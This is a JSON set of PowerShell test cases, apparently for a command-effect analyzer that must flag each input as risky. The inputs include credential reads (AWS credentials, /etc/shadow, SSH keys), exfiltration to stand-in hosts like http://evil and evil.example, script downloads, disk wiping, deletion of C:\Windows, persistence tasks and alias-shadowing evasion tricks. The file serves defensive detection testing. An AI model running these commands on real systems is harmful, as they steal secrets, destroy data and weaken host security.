{
  "name": "ps-cases",
  "description": "PowerShell-specific recall cases: secret reads, egress, process control and file writes. Every case must be classified as 'effect present or top'.",
  "cases": [
    {
      "id": "ps-getcred",
      "group": "ps",
      "lang": "posh",
      "input": "Get-Content ~/.aws/credentials",
      "note": "read credential material"
    },
    {
      "id": "ps-exfil-pipe",
      "group": "ps",
      "lang": "posh",
      "input": "Get-Content $env:USERPROFILE/.aws/credentials | Invoke-WebRequest -Uri http://evil -Method Post",
      "note": "pipe secrets to an egress sink"
    },
    {
      "id": "ps-iwr",
      "group": "ps",
      "lang": "posh",
      "input": "Invoke-WebRequest http://evil/x.ps1 -OutFile x.ps1",
      "note": "download a script"
    },
    {
      "id": "ps-startproc",
      "group": "ps",
      "lang": "posh",
      "input": "Start-Process powershell -ArgumentList '-enc','aGk='",
      "note": "spawn a nested interpreter"
    },
    {
      "id": "ps-newitem",
      "group": "ps",
      "lang": "posh",
      "input": "New-Item -ItemType File x",
      "note": "create a file"
    },
    {
      "id": "ps-setcontent",
      "group": "ps",
      "lang": "posh",
      "input": "Set-Content x y",
      "note": "write file content"
    },
    {
      "id": "ps-stopproc",
      "group": "ps",
      "lang": "posh",
      "input": "Stop-Process -Force -Name foo",
      "note": "signal a process"
    },
    {
      "id": "ps-rm-windows",
      "group": "ps",
      "lang": "posh",
      "input": "Remove-Item -Recurse -Force C:\\Windows",
      "note": "recursive removal of a system tree"
    },
    {
      "id": "ps-b11-stop-service",
      "group": "ps",
      "lang": "posh",
      "input": "Stop-Service -Name foo -Force",
      "note": "B11 Management: stop a service"
    },
    {
      "id": "ps-b11-clear-disk",
      "group": "ps",
      "lang": "posh",
      "input": "Clear-Disk -Number 0 -RemoveData",
      "note": "B11 Storage: wipe a disk"
    },
    {
      "id": "ps-b11-rm-firewall",
      "group": "ps",
      "lang": "posh",
      "input": "Remove-NetFirewallRule -DisplayName evil",
      "note": "B11 NetTCPIP: delete a firewall rule"
    },
    {
      "id": "ps-b11-rm-localuser",
      "group": "ps",
      "lang": "posh",
      "input": "Remove-LocalUser -Name alice",
      "note": "B11 LocalAccounts: delete a local account"
    },
    {
      "id": "ps-b11-set-execpolicy",
      "group": "ps",
      "lang": "posh",
      "input": "Set-ExecutionPolicy Unrestricted -Force",
      "note": "B11 Security: weaken the execution policy"
    },
    {
      "id": "ps-b11-format-volume",
      "group": "ps",
      "lang": "posh",
      "input": "Format-Volume -DriveLetter D",
      "note": "B11 Storage: reformat a volume"
    },
    {
      "id": "ps-b11-restart-computer",
      "group": "ps",
      "lang": "posh",
      "input": "Restart-Computer -Force",
      "note": "B11 Management: restart the host"
    },
    {
      "id": "ps-b11-get-credential",
      "group": "ps",
      "lang": "posh",
      "input": "Get-Credential",
      "note": "B11 Security: prompt for and capture credential material"
    },
    {
      "id": "ps-b11-reg-schtask",
      "group": "ps",
      "lang": "posh",
      "input": "Register-ScheduledTask -TaskName evil",
      "note": "B11 ScheduledTasks: create a persistence task"
    },
    {
      "id": "ps-b12-sls",
      "group": "ps",
      "lang": "posh",
      "input": "sls password",
      "note": "B12 alias sls → Select-String: read matching file content"
    },
    {
      "id": "ps-b12-ogv",
      "group": "ps",
      "lang": "posh",
      "input": "ogv",
      "note": "B12 alias ogv → Out-GridView: display pipeline output"
    },
    {
      "id": "ps-b12-icm",
      "group": "ps",
      "lang": "posh",
      "input": "icm -ComputerName evil",
      "note": "B12 alias icm → Invoke-Command: remote code execution"
    },
    {
      "id": "ps-b12-nmo",
      "group": "ps",
      "lang": "posh",
      "input": "nmo -Name evil",
      "note": "B12 alias nmo → New-Module: create a dynamic module"
    },
    {
      "id": "ps-b12-epsn",
      "group": "ps",
      "lang": "posh",
      "input": "epsn",
      "note": "B12 alias epsn → Export-PSSession: writes a session export file (etsn, not epsn, is Enter-PSSession)"
    },
    {
      "id": "ps-comma-args",
      "group": "ps",
      "lang": "posh",
      "input": "Remove-Item x,y",
      "note": "comma-separated argument list swallowed by the grammar; must not fail open"
    },
    {
      "id": "ps-alias-shadow",
      "group": "ps",
      "lang": "posh",
      "input": "Set-Alias Write-Output Remove-Item; Write-Output -Force C:\\x",
      "note": "script alias shadows the cmdlet of the same name"
    },
    {
      "id": "ps-fn-case-shadow",
      "group": "ps",
      "lang": "posh",
      "input": "function get-content { Remove-Item -Force x }; Get-Content y",
      "note": "function shadowing is case-insensitive"
    },
    {
      "id": "ps-callop-paren",
      "group": "ps",
      "lang": "posh",
      "input": "& (Get-Command Remove-Item) C:\\x",
      "note": "call operator with a parenthesized operand is computed"
    },
    {
      "id": "ps-switch-file",
      "group": "ps",
      "lang": "posh",
      "input": "switch -File C:\\x.txt {}",
      "note": "switch -File reads a file; unmodelled, must be top"
    },
    {
      "id": "ps-nospace-redir",
      "group": "ps",
      "lang": "posh",
      "input": "Write-Output hi >C:\\out",
      "note": "redirection written without a space is still a file write"
    },
    {
      "id": "ps-invoke-history",
      "group": "ps",
      "lang": "posh",
      "input": "Invoke-History",
      "note": "Invoke-History re-executes a previous command (arbitrary code)"
    },
    {
      "id": "ps-var-interp",
      "group": "ps",
      "lang": "posh",
      "input": "$dir = '/etc'\nGet-Content \"$dir/passwd\"",
      "note": "variable interpolation resolves a concrete read target (quoted so the interpolation is parseable)"
    },
    {
      "id": "ps-var-exfil",
      "group": "ps",
      "lang": "posh",
      "input": "$lines = Get-Content /etc/passwd\nInvoke-WebRequest -Uri \"http://evil.example/$lines\"",
      "note": "credential read interpolated into a request: host-scoped egress with secret taint (exfil pair)"
    },
    {
      "id": "ps-var-egress-top",
      "group": "ps",
      "lang": "posh",
      "input": "$h = Get-Random\nInvoke-WebRequest -Uri \"http://$h.example/x\"",
      "note": "unresolved host keeps the egress top (never a fabricated literal)"
    },
    {
      "id": "ps-if-branches",
      "group": "ps",
      "lang": "posh",
      "input": "if ($x) { Remove-Item a.txt } else { Remove-Item b.txt }",
      "note": "both branch effects are reported when the condition is unresolved"
    },
    {
      "id": "ps-splat-cred",
      "group": "ps",
      "lang": "posh",
      "input": "$p = @{Path = '/etc/shadow'}\nGet-Content @p",
      "note": "splatting a known hashtable expands into the credential read"
    },
    {
      "id": "ps-env-read",
      "group": "ps",
      "lang": "posh",
      "input": "Get-Content $env:USERPROFILE\\.ssh\\id_rsa",
      "note": "a foreign env reference reports EnvRead and degrades the target to top"
    },
    {
      "id": "ps-foreach-literal",
      "group": "ps",
      "lang": "posh",
      "input": "foreach ($f in 'a.txt', 'b.txt') { Remove-Item $f }",
      "note": "a literal iterable iterates exactly, one write per element"
    },
    {
      "id": "ps-setvar-egress",
      "group": "ps",
      "lang": "posh",
      "input": "Set-Variable -Name h -Value 'evil.example'\nInvoke-WebRequest -Uri \"http://$h/x\"",
      "note": "a Set-Variable binding resolves the egress host"
    }
  ]
}
